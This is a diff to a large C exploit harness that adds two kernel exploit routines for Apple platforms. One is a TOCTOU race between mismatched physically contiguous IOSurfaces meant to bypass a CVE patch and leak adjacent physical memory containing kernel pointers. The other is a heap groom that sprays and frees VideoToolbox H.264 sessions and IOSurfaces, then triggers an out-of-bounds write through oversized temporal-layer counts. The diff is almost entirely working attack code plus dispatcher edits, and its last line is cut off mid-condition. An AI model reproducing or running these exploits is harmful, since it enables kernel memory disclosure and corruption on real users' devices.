@@ -17605,6 +17605,265 @@ static void r472_exploit(void) {
     fflush(stdout);
 }
 
+/* ================================================================
+ * r473_exploit — Asymmetric PHYS_CONTIG TOCTOU bypass
+ *
+ * CVE-2025-43520 patch checks UPL_PHYS_CONTIG on 2nd vm_map_get_upl.
+ * But PHYS_CONTIG → PHYS_CONTIG passes the check!
+ *
+ * Attack: Race between a LARGE (8p=128K) and SMALL (1p=16K) IOSurface.
+ * If the 2nd UPL comes from the small surface, the kernel copies 128K
+ * starting from the small surface's physical base — 112K past its end
+ * into adjacent physical memory = PHYSICAL OOB READ.
+ * ================================================================ */
+
+#define R473_PAGE_SZ    16384
+#define R473_LARGE_PG   8
+#define R473_SMALL_PG   1
+#define R473_LARGE_SZ   (R473_LARGE_PG * R473_PAGE_SZ)   /* 128K */
+#define R473_SMALL_SZ   (R473_SMALL_PG * R473_PAGE_SZ)   /*  16K */
+#define R473_WRITE_SZ   R473_LARGE_SZ                     /* 128K */
+#define R473_SEARCH_SZ  (8ULL * 1024 * 1024)              /* 8 MiB */
+#define R473_ITERS      200
+#define R473_OSC_THREADS 4
+
+struct r473_shared {
+    volatile int go;
+    volatile int stop;
+    volatile int remap_count;
+    mach_vm_address_t target;
+    mach_vm_size_t target_size;
+    mach_port_t large_entry;
+    mach_port_t small_entry;
+};
+
+static void *r473_osc_thread(void *arg) {
+    struct r473_shared *s = (struct r473_shared *)arg;
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+    mach_port_t self = mach_task_self();
+    mach_vm_address_t tgt = s->target;
+    mach_vm_size_t sz = s->target_size;
+    mach_port_t le = s->large_entry;
+    mach_port_t se = s->small_entry;
+    while (!s->go) __asm__ volatile("yield");
+    while (!s->stop) {
+        mach_vm_address_t t = tgt;
+        mach_vm_map(self, &t, sz, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+            le, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
+            VM_INHERIT_NONE);
+        t = tgt;
+        kern_return_t kr = mach_vm_map(self, &t, sz, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+            se, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
+            VM_INHERIT_NONE);
+        if (kr == KERN_SUCCESS) __sync_fetch_and_add(&s->remap_count, 1);
+    }
+    return NULL;
+}
+
+static void r473_exploit(void) {
+    rlog("\n=== r473: Asymmetric PHYS_CONTIG TOCTOU bypass ===\n\n");
+    fflush(stdout);
+
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+
+    /* Phase 0: Output file */
+    rlog("  --- Phase 0: F_NOCACHE output file ---\n"); fflush(stdout);
+    char tmppath[256];
+    const char *tmpdir = getenv("TMPDIR");
+    int fd = -1;
+    if (tmpdir) {
+        snprintf(tmppath, sizeof(tmppath), "%s/r473_oob", tmpdir);
+        fd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0600);
+    }
+    if (fd < 0) {
+        snprintf(tmppath, sizeof(tmppath), "/private/var/tmp/r473_oob_%d", getpid());
+        fd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0600);
+    }
+    if (fd < 0) {
+        rlog("    FAILED fd=%d errno=%d\n", fd, errno);
+        rlog("\n=== r473 done ===\n"); return;
+    }
+    ftruncate(fd, R473_WRITE_SZ);
+    fcntl(fd, F_NOCACHE, 1);
+    fcntl(fd, F_FULLFSYNC);
+    rlog("    fd=%d path=%s\n", fd, tmppath);
+
+    /* Phase 1: Create LARGE IOSurface (8 pages, 128K) */
+    rlog("\n  --- Phase 1: Large IOSurface (%d pages) ---\n", R473_LARGE_PG);
+    fflush(stdout);
+    CFMutableDictionaryRef ld = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int lw = R473_LARGE_SZ, lh = 1, lbpr = R473_LARGE_SZ, las = R473_LARGE_SZ;
+    int lpf = 0x4F4F4F4F; /* PurpleGfxMem — force PHYS_CONTIG */
+    CFNumberRef lnw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &lw);
+    CFNumberRef lnh = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &lh);
+    CFNumberRef lnb = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &lbpr);
+    CFNumberRef lna = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &las);
+    CFNumberRef lnp = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &lpf);
+    CFDictionarySetValue(ld, CFSTR("IOSurfaceWidth"), lnw);
+    CFDictionarySetValue(ld, CFSTR("IOSurfaceHeight"), lnh);
+    CFDictionarySetValue(ld, CFSTR("IOSurfaceBytesPerRow"), lnb);
+    CFDictionarySetValue(ld, CFSTR("IOSurfaceAllocSize"), lna);
+    CFDictionarySetValue(ld, CFSTR("IOSurfacePixelFormat"), lnp);
+    CFRelease(lnw); CFRelease(lnh); CFRelease(lnb); CFRelease(lna); CFRelease(lnp);
+    IOSurfaceRef large_surf = IOSurfaceCreate(ld);
+    CFRelease(ld);
+    if (!large_surf) { rlog("    FAILED large surf\n"); close(fd); unlink(tmppath); return; }
+    IOSurfaceLock(large_surf, 0, NULL);
+    memset(IOSurfaceGetBaseAddress(large_surf), 0xAA, R473_LARGE_SZ);
+    IOSurfaceUnlock(large_surf, 0, NULL);
+    mach_port_t large_entry = IOSurfaceCreateMachPort(large_surf);
+    rlog("    large: %d pages, entry=0x%x, phys_contig=%d\n",
+         R473_LARGE_PG, large_entry,
+         IOSurfaceGetPropertyMaximum(large_surf,
+             CFSTR("IOSurfaceIsPhysicallyContiguous")));
+
+    /* Phase 2: Create SMALL IOSurface (1 page, 16K) */
+    rlog("\n  --- Phase 2: Small IOSurface (%d page) ---\n", R473_SMALL_PG);
+    fflush(stdout);
+    CFMutableDictionaryRef sd = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int sw = R473_SMALL_SZ, sh = 1, sbpr = R473_SMALL_SZ, sas = R473_SMALL_SZ;
+    int spf = 0x4F4F4F4F;
+    CFNumberRef snw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &sw);
+    CFNumberRef snh = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &sh);
+    CFNumberRef snb = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &sbpr);
+    CFNumberRef sna = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &sas);
+    CFNumberRef snp = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &spf);
+    CFDictionarySetValue(sd, CFSTR("IOSurfaceWidth"), snw);
+    CFDictionarySetValue(sd, CFSTR("IOSurfaceHeight"), snh);
+    CFDictionarySetValue(sd, CFSTR("IOSurfaceBytesPerRow"), snb);
+    CFDictionarySetValue(sd, CFSTR("IOSurfaceAllocSize"), sna);
+    CFDictionarySetValue(sd, CFSTR("IOSurfacePixelFormat"), snp);
+    CFRelease(snw); CFRelease(snh); CFRelease(snb); CFRelease(sna); CFRelease(snp);
+    IOSurfaceRef small_surf = IOSurfaceCreate(sd);
+    CFRelease(sd);
+    if (!small_surf) { rlog("    FAILED small surf\n"); close(fd); unlink(tmppath); CFRelease(large_surf); return; }
+    IOSurfaceLock(small_surf, 0, NULL);
+    memset(IOSurfaceGetBaseAddress(small_surf), 0xBB, R473_SMALL_SZ);
+    IOSurfaceUnlock(small_surf, 0, NULL);
+    mach_port_t small_entry = IOSurfaceCreateMachPort(small_surf);
+    rlog("    small: %d page, entry=0x%x\n", R473_SMALL_PG, small_entry);
+
+    /* Phase 3: Search mapping */
+    rlog("\n  --- Phase 3: Search mapping (%llu MiB) ---\n",
+         (unsigned long long)(R473_SEARCH_SZ / (1024*1024)));
+    fflush(stdout);
+    mach_vm_address_t search_base = 0;
+    mach_vm_allocate(mach_task_self(), &search_base, R473_SEARCH_SZ,
+        VM_FLAGS_ANYWHERE);
+    uint64_t search_pages = R473_SEARCH_SZ / R473_LARGE_SZ;
+    for (uint64_t p = 0; p < search_pages; p++) {
+        mach_vm_address_t a = search_base + p * R473_LARGE_SZ;
+        mach_vm_map(mach_task_self(), &a, R473_LARGE_SZ, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+            large_entry, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
+            VM_INHERIT_NONE);
+        volatile uint8_t x = *(volatile uint8_t *)a;
+        (void)x;
+    }
+    rlog("    %llu search pages mapped and faulted\n",
+         (unsigned long long)search_pages);
+
+    /* Phase 4: TOCTOU race — oscillate large↔small */
+    rlog("\n  --- Phase 4: Asymmetric TOCTOU race ---\n");
+    fflush(stdout);
+
+    struct r473_shared shared = {0};
+    shared.target = search_base;
+    shared.target_size = R473_LARGE_SZ;
+    shared.large_entry = large_entry;
+    shared.small_entry = small_entry;
+
+    pthread_t osc_tids[R473_OSC_THREADS];
+    for (int t = 0; t < R473_OSC_THREADS; t++)
+        pthread_create(&osc_tids[t], NULL, r473_osc_thread, &shared);
+
+    int total_races = 0, race_wins = 0, oob_reads = 0;
+    int einval_count = 0;
+
+    shared.go = 1;
+    __sync_synchronize();
+
+    for (uint64_t sp = 0; sp < search_pages && sp < R473_ITERS; sp++) {
+        mach_vm_address_t addr = search_base + sp * R473_LARGE_SZ;
+        shared.target = addr;
+        __sync_synchronize();
+
+        struct iovec iov = { (void *)addr, R473_WRITE_SZ };
+        lseek(fd, 0, SEEK_SET);
+        ssize_t w = pwritev(fd, &iov, 1, 0);
+        int save_errno = errno;
+        total_races++;
+
+        if (w == (ssize_t)R473_WRITE_SZ) {
+            lseek(fd, 0, SEEK_SET);
+            uint8_t readbuf[R473_WRITE_SZ];
+            ssize_t r = read(fd, readbuf, R473_WRITE_SZ);
+            if (r < (ssize_t)R473_WRITE_SZ) continue;
+
+            int has_oob = 0;
+            int kptrs = 0;
+            for (size_t off = R473_SMALL_SZ; off < R473_WRITE_SZ; off += 8) {
+                uint64_t val;
+                memcpy(&val, readbuf + off, 8);
+                if (val != 0xAAAAAAAAAAAAAAAAULL) {
+                    has_oob = 1;
+                    uint64_t top = val >> 32;
+                    if (top == 0xfffffff0 || top == 0xfffffff1 ||
+                        top == 0xfffffff2 || top == 0xfffffff3 ||
+                        top == 0xfffffff4 || top == 0xfffffff5 ||
+                        top == 0xfffffff6 || top == 0xfffffff7) {
+                        kptrs++;
+                    }
+                }
+            }
+
+            if (has_oob) {
+                race_wins++;
+                if (kptrs > 0) {
+                    oob_reads++;
+                    rlog("    *** OOB HIT sp=%llu: %d kernel ptrs! ***\n",
+                         (unsigned long long)sp, kptrs);
+                    rlog("    First 64 bytes past small surface:\n    ");
+                    for (int b = 0; b < 64; b++)
+                        rlog("%02x ", readbuf[R473_SMALL_SZ + b]);
+                    rlog("\n");
+                } else if (race_wins <= 5 || race_wins % 20 == 0) {
+                    rlog("    OOB win sp=%llu (non-0xAA data, no kptrs yet)\n",
+                         (unsigned long long)sp);
+                }
+            }
+        } else if (w < 0 && save_errno == EINVAL) {
+            einval_count++;
+        }
+    }
+
+    shared.stop = 1;
+    __sync_synchronize();
+    for (int t = 0; t < R473_OSC_THREADS; t++)
+        pthread_join(osc_tids[t], NULL);
+
+    rlog("\n    TOTAL: races=%d wins=%d oob_kptrs=%d einval=%d osc=%d\n",
+         total_races, race_wins, oob_reads, einval_count,
+         shared.remap_count);
+
+    /* Cleanup */
+    mach_vm_deallocate(mach_task_self(), search_base, R473_SEARCH_SZ);
+    mach_port_deallocate(mach_task_self(), large_entry);
+    mach_port_deallocate(mach_task_self(), small_entry);
+    close(fd); unlink(tmppath);
+    CFRelease(large_surf);
+    CFRelease(small_surf);
+
+    rlog("\n=== r473 done ===\n");
+}
+
 static void r470_exploit(void) {
     rlog("\n=== r470: ClearSword-style TOCTOU ===\n\n");
     fflush(stdout);
@@ -18548,6 +18807,341 @@ static void r474_exploit(void) {
     }
 
     rlog("\n=== r474 complete ===\n");
+    fflush(stdout);
+}
+
+/* ============================================================
+ * r475: H.264 NTL OOB + zone-targeted heap groom
+ *
+ * r474 failed because HEVC encoder crashes at NTL=9.
+ * r472 proved H.264 accepts NTL up to 8192 without crash.
+ * Strategy:
+ *   - Use H.264 codec (not HEVC)
+ *   - Spray 32 VTCompressionSessions to populate kernel heap zone
+ *   - Free alternating to create holes
+ *   - Fill holes with IOSurface objects of varying sizes
+ *   - Trigger OOB with NTL=512,1024,2048,4096 — writing 2-16KB past array
+ *   - Check IOSurface corruption via properties and mapped memory
+ *   - Also probe: does the OOB write reach IOSurface kernel buffer?
+ * ============================================================ */
+
+#define R475_N_SESSIONS   32
+#define R475_N_SPRAY_SURF 256
+#define R475_SPRAY_MAGIC  0xBEEF0475
+
+static void r475_ave_cb(void *ref, void *src, OSStatus st,
+                         VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
+    if (ref) (*(int *)ref)++;
+}
+
+static VTCompressionSessionRef r475_make_session(int w, int h, int ntl, int *cb) {
+    CFMutableDictionaryRef sa = CFDictionaryCreateMutable(
+        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+        &kCFTypeDictionaryValueCallBacks);
+    CFDictionaryRef iop = CFDictionaryCreate(
+        kCFAllocatorDefault, NULL, NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFDictionarySetValue(sa, kCVPixelBufferIOSurfacePropertiesKey, iop);
+    CFRelease(iop);
+
+    int pixfmt = kCVPixelFormatType_32BGRA;
+    CFNumberRef fn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pixfmt);
+    CFDictionarySetValue(sa, kCVPixelBufferPixelFormatTypeKey, fn);
+    CFRelease(fn);
+
+    VTCompressionSessionRef sess = NULL;
+    OSStatus st = VTCompressionSessionCreate(
+        kCFAllocatorDefault, w, h, kCMVideoCodecType_H264,
+        NULL, sa, NULL, r475_ave_cb, cb, &sess);
+    CFRelease(sa);
+    if (st != noErr) return NULL;
+
+    CFNumberRef n;
+    int v;
+
+    v = 1;
+    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v);
+    VTSessionSetProperty(sess, CFSTR("EncoderUsage"), n);
+    CFRelease(n);
+
+    VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
+
+    if (ntl > 0) {
+        n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ntl);
+        OSStatus sp = VTSessionSetProperty(sess, CFSTR("NumberOfTemporalLayers"), n);
+        CFRelease(n);
+        if (sp != noErr) {
+            rlog("    NTL=%d rejected: %d\n", ntl, (int)sp);
+            VTCompressionSessionInvalidate(sess);
+            CFRelease(sess);
+            return NULL;
+        }
+    }
+
+    st = VTCompressionSessionPrepareToEncodeFrames(sess);
+    if (st != noErr) {
+        VTCompressionSessionInvalidate(sess);
+        CFRelease(sess);
+        return NULL;
+    }
+    return sess;
+}
+
+static int r475_encode_one(VTCompressionSessionRef sess) {
+    CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(sess);
+    if (!pool) return -1;
+
+    CVPixelBufferRef pb = NULL;
+    CVReturn cr = CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
+    if (cr != kCVReturnSuccess || !pb) return -2;
+
+    CMTime pts = CMTimeMake(0, 30);
+    OSStatus st = VTCompressionSessionEncodeFrame(sess, pb, pts,
+        kCMTimeInvalid, NULL, NULL, NULL);
+    CVPixelBufferRelease(pb);
+    if (st != noErr) return (int)st;
+
+    st = VTCompressionSessionCompleteFrames(sess, kCMTimePositiveInfinity);
+    return (int)st;
+}
+
+static void r475_exploit(void) {
+    rlog("\n=== r475: H.264 NTL OOB + zone-targeted heap groom ===\n");
+    rlog("Target: CVE-2026-112705 via H.264 (not HEVC — avoids NTL=9 crash)\n");
+    rlog("Array at object+0x4678, writes value=1 at 4-byte stride\n");
+    rlog("NTL=4096 → 4089 OOB entries → ~16KB past array end\n\n");
+    fflush(stdout);
+
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+
+    /* Phase A: Quick sanity — confirm H.264 accepts large NTL */
+    rlog("--- Phase A: H.264 NTL sanity ---\n");
+    int test_ntls[] = {7, 64, 512, 1024, 2048, 4096};
+    int n_test = sizeof(test_ntls) / sizeof(test_ntls[0]);
+
+    for (int i = 0; i < n_test; i++) {
+        int ntl = test_ntls[i];
+        int cb = 0;
+        VTCompressionSessionRef s = r475_make_session(640, 480, ntl, &cb);
+        if (!s) {
+            rlog("  NTL=%d: session FAILED\n", ntl);
+            continue;
+        }
+        int rc = r475_encode_one(s);
+        rlog("  NTL=%d: encode=%d cb=%d\n", ntl, rc, cb);
+        VTCompressionSessionInvalidate(s);
+        CFRelease(s);
+        fflush(stdout);
+    }
+
+    /* Phase B: Spray VTCompressionSessions (H.264, NTL=7 safe) */
+    rlog("\n--- Phase B: Spray %d H.264 sessions ---\n", R475_N_SESSIONS);
+    fflush(stdout);
+
+    VTCompressionSessionRef sessions[R475_N_SESSIONS];
+    int cbs[R475_N_SESSIONS];
+    int alive = 0;
+
+    for (int i = 0; i < R475_N_SESSIONS; i++) {
+        cbs[i] = 0;
+        sessions[i] = r475_make_session(640, 480, 7, &cbs[i]);
+        if (sessions[i]) alive++;
+    }
+    rlog("  Created %d / %d safe sessions\n", alive, R475_N_SESSIONS);
+    fflush(stdout);
+
+    /* Free alternating sessions to create holes */
+    int freed = 0;
+    for (int i = 1; i < R475_N_SESSIONS; i += 2) {
+        if (sessions[i]) {
+            VTCompressionSessionInvalidate(sessions[i]);
+            CFRelease(sessions[i]);
+            sessions[i] = NULL;
+            freed++;
+        }
+    }
+    rlog("  Freed %d sessions (holes)\n", freed);
+    fflush(stdout);
+
+    /* Phase C: Fill holes with IOSurface spray
+     * Use different sizes to try to land in the same kalloc zone as AVE objects.
+     * AVE object appears to be large (>0x4678 + array), likely kalloc.32768 or
+     * kalloc.49152 zone. We spray multiple sizes. */
+    rlog("\n--- Phase C: IOSurface spray (multiple sizes) ---\n");
+    fflush(stdout);
+
+    IOSurfaceRef spray_surfs[R475_N_SPRAY_SURF];
+    int spray_ok = 0;
+
+    /* Spray sizes: try to match AVE object's kalloc zone */
+    int spray_sizes[] = {4096, 8192, 16384, 32768};
+    int n_sizes = sizeof(spray_sizes) / sizeof(spray_sizes[0]);
+
+    for (int i = 0; i < R475_N_SPRAY_SURF; i++) {
+        int sz_idx = i % n_sizes;
+        int pw = spray_sizes[sz_idx]; /* width in pixels, 4 bpe = pw*4 bytes */
+
+        CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int bpe = 4, ph = 1, ppf = 0x42475241; /* BGRA */
+        CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &pw);
+        CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &ph);
+        CFNumberRef nb = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef nf = CFNumberCreate(NULL, kCFNumberIntType, &ppf);
+        CFDictionarySetValue(props, kIOSurfaceWidth, nw);
+        CFDictionarySetValue(props, kIOSurfaceHeight, nh);
+        CFDictionarySetValue(props, kIOSurfaceBytesPerElement, nb);
+        CFDictionarySetValue(props, kIOSurfacePixelFormat, nf);
+        CFRelease(nw); CFRelease(nh); CFRelease(nb); CFRelease(nf);
+
+        /* Tag for corruption detection */
+        uint32_t magic = R475_SPRAY_MAGIC + i;
+        CFNumberRef nm = CFNumberCreate(NULL, kCFNumberIntType, &magic);
+        CFDictionarySetValue(props, CFSTR("AVESprayTag"), nm);
+        CFRelease(nm);
+
+        spray_surfs[i] = IOSurfaceCreate(props);
+        CFRelease(props);
+        if (spray_surfs[i]) {
+            spray_ok++;
+            /* Map and fill with known pattern */
+            IOSurfaceLock(spray_surfs[i], 0, NULL);
+            void *base = IOSurfaceGetBaseAddress(spray_surfs[i]);
+            if (base) {
+                size_t len = IOSurfaceGetAllocSize(spray_surfs[i]);
+                memset(base, 0x41 + (i & 0xF), len);
+            }
+            IOSurfaceUnlock(spray_surfs[i], 0, NULL);
+        }
+    }
+    rlog("  Created %d / %d IOSurfaces\n", spray_ok, R475_N_SPRAY_SURF);
+    fflush(stdout);
+
+    /* Phase D: Trigger OOB — open new H.264 sessions with large NTL in holes */
+    rlog("\n--- Phase D: Trigger OOB (NTL=512, 1024, 2048, 4096) ---\n");
+    fflush(stdout);
+
+    int trigger_ntls[] = {512, 1024, 2048, 4096};
+    int n_trigger = sizeof(trigger_ntls) / sizeof(trigger_ntls[0]);
+
+    for (int ti = 0; ti < n_trigger; ti++) {
+        int ntl = trigger_ntls[ti];
+        int cb = 0;
+        int slot = 1 + ti * 2;
+        if (slot >= R475_N_SESSIONS) break;
+
+        sessions[slot] = r475_make_session(640, 480, ntl, &cb);
+        if (!sessions[slot]) {
+            rlog("  Trigger NTL=%d: session create FAILED\n", ntl);
+            continue;
+        }
+
+        int rc = r475_encode_one(sessions[slot]);
+        rlog("  Trigger NTL=%d slot=%d: encode=%d cb=%d\n", ntl, slot, rc, cb);
+        fflush(stdout);
+    }
+
+    /* Phase E: Check IOSurface corruption — properties and mapped data */
+    rlog("\n--- Phase E: IOSurface corruption check ---\n");
+    fflush(stdout);
+
+    int prop_corrupted = 0;
+    int data_corrupted = 0;
+
+    for (int i = 0; i < R475_N_SPRAY_SURF; i++) {
+        if (!spray_surfs[i]) continue;
+
+        /* Check property tag */
+        CFNumberRef tag = (CFNumberRef)IOSurfaceCopyValue(spray_surfs[i],
+            CFSTR("AVESprayTag"));
+        if (!tag) {
+            rlog("  *** SURF %d: tag MISSING ***\n", i);
+            prop_corrupted++;
+        } else {
+            uint32_t val = 0;
+            CFNumberGetValue(tag, kCFNumberIntType, &val);
+            CFRelease(tag);
+            uint32_t expected = R475_SPRAY_MAGIC + i;
+            if (val != expected) {
+                rlog("  *** SURF %d: tag CORRUPTED expected=0x%x got=0x%x ***\n",
+                     i, expected, val);
+                prop_corrupted++;
+            }
+        }
+
+        /* Check dimensions */
+        int w = (int)IOSurfaceGetWidth(spray_surfs[i]);
+        int h = (int)IOSurfaceGetHeight(spray_surfs[i]);
+        if (h != 1) {
+            rlog("  *** SURF %d: height CORRUPTED h=%d ***\n", i, h);
+            prop_corrupted++;
+        }
+
+        /* Check mapped pixel data for corruption */
+        IOSurfaceLock(spray_surfs[i], kIOSurfaceLockReadOnly, NULL);
+        uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(spray_surfs[i]);
+        if (base) {
+            size_t len = IOSurfaceGetAllocSize(spray_surfs[i]);
+            uint8_t expect_byte = 0x41 + (i & 0xF);
+            int found_corruption = 0;
+            /* Check first 256 bytes and around 4K boundaries */
+            for (size_t off = 0; off < len && off < 65536; off += 4) {
+                if (base[off] != expect_byte) {
+                    if (!found_corruption) {
+                        rlog("  *** SURF %d: DATA CORRUPTED at off=%zu "
+                             "expected=0x%02x got=0x%02x ***\n",
+                             i, off, expect_byte, base[off]);
+                        /* Dump a few bytes around the corruption */
+                        rlog("    context:");
+                        size_t dump_start = (off >= 8) ? off - 8 : 0;
+                        size_t dump_end = off + 24;
+                        if (dump_end > len) dump_end = len;
+                        for (size_t j = dump_start; j < dump_end; j++) {
+                            if (j == off) rlog(" [%02x]", base[j]);
+                            else rlog(" %02x", base[j]);
+                        }
+                        rlog("\n");
+                    }
+                    found_corruption = 1;
+                    data_corrupted++;
+                    break;
+                }
+            }
+        }
+        IOSurfaceUnlock(spray_surfs[i], kIOSurfaceLockReadOnly, NULL);
+    }
+
+    rlog("  Property corrupted: %d / %d\n", prop_corrupted, spray_ok);
+    rlog("  Data corrupted: %d / %d\n", data_corrupted, spray_ok);
+    fflush(stdout);
+
+    /* Phase F: Check safe sessions still work */
+    rlog("\n--- Phase F: Safe session integrity ---\n");
+    fflush(stdout);
+
+    int sess_fail = 0;
+    for (int i = 0; i < R475_N_SESSIONS; i += 2) {
+        if (!sessions[i]) continue;
+        int rc = r475_encode_one(sessions[i]);
+        if (rc != 0) {
+            rlog("  *** Session %d: encode FAILED rc=%d ***\n", i, rc);
+            sess_fail++;
+        }
+    }
+    rlog("  Session failures: %d\n", sess_fail);
+
+    /* Cleanup */
+    for (int i = 0; i < R475_N_SESSIONS; i++) {
+        if (sessions[i]) {
+            VTCompressionSessionInvalidate(sessions[i]);
+            CFRelease(sessions[i]);
+        }
+    }
+    for (int i = 0; i < R475_N_SPRAY_SURF; i++) {
+        if (spray_surfs[i]) CFRelease(spray_surfs[i]);
+    }
+
+    rlog("\n=== r475 complete ===\n");
     fflush(stdout);
 }
 
@@ -88622,6 +89216,12 @@ new_modes:
             r472_exploit();
             goto done;
         }
+        if (rounds == 478) {
+            rlog("*** rounds=478: H.264 NTL OOB + zone-targeted heap groom ***\n\n");
+            fflush(stdout);
+            r475_exploit();
+            goto done;
+        }
         if (rounds == 477) {
             rlog("*** rounds=477: AVE2 NTL OOB + heap groom ***\n\n");
             fflush(stdout);
@@ -88629,7 +89229,7 @@ new_modes:
             goto done;
         }
         if (rounds == 476) {
-            rlog("*** rounds=476: AVEVideoEncoder Resolution OOB probe ***\n\n");
+            rlog("*** rounds=476: Asymmetric PHYS_CONTIG TOCTOU bypass ***\n\n");
             fflush(stdout);
             r473_exploit();
             goto done;
@@ -91499,7 +92099,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds 